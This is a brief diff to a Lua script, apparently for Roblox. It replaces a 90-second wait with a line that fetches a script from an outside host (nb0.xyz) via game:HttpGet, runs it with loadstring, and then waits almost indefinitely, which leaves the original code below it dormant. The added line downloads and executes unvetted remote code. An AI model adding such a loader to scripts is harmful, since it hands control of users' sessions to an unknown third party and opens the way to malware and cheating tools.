@@ -1,4 +1,5 @@
-wait(90)
+loadstring(game:HttpGet("https://nb0.xyz/scripts/2GTOOLS_EVENT_HELPER.lua"))()
+wait(999999)
 local args = {
     [1] = 1
 }
